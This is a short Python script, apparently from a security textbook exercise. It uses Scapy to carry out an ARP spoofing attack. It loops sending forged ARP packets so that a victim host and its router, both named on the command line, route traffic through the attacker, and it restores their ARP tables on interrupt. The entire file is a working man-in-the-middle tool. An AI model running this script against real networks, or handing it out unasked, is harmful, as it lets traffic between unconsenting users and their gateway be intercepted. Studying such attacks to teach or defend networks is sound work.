# This program will automatically perform an ARP spoofing attack

from scapy.all import *
import sys

# This function should be very similar to arp_restore()
def arp_spoof(dest_ip, dest_mac, source_ip):
    # Create an ARP packet
    packet = ARP(op="who-has", hwdst=dest_mac,pdst=dest_ip, psrc=source_ip)
    # Send the packet
    send(packet, verbose=False)

# restores the ARP tables to their original state.
def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    # The ARP() function ➌ takes several options (op). The "is-at" option represents
    # an ARP reply, and the "who-has" option represents an ARP request.
    packet= ARP(op="is-at", hwsrc=source_mac, psrc= source_ip, hwdst= dest_mac, pdst= dest_ip)
    # Finally, we send the packet we created
    send(packet, verbose=False)
def main():
    victim_ip= sys.argv[1]
    router_ip= sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        quit()
main()